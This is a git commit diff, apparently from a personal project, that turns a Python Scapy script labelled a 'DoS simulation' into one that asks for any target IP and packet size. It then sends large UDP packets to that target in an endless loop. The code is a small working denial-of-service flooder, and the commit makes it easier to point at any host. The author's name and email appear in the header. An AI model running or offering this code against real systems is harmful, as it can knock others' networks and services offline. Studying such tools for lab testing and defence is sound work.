a7779ddc952af26c075de420079e2a1ddb5c9b30
Ponleou Keo Sok <ponleousk@gmail.com>
2024-05-16 19:26:13 +0700

    feat: create user input for dos simulation

--- dos_simulation.py
+++ dos_simulation.py
@@ -1,11 +1,21 @@
 import scapy.all as scp
-from datetime import date
 
-ip_layer = scp.IP(dst="192.168.8.101")
-udp_layer = scp.UDP()
-raw_layer = scp.Raw(65500)
+ip_dst = input("Target IP: ")
+pkg_size = input("Package Size (blank for max): ")
 
-package = ip_layer / udp_layer / raw_layer
 
-scp.send(package, loop=1)
-print(package)
+def dos_simulation(ip_dst, pkg_size):
+    if not (pkg_size):
+        pkg_size = 65500
+
+    ip_layer = scp.IP(dst=ip_dst)
+    udp_layer = scp.UDP()
+    raw_layer = scp.Raw(int(pkg_size))
+
+    package = ip_layer / udp_layer / raw_layer
+
+    scp.send(package, loop=1)
+    print(package)
+
+
+dos_simulation(ip_dst, pkg_size)
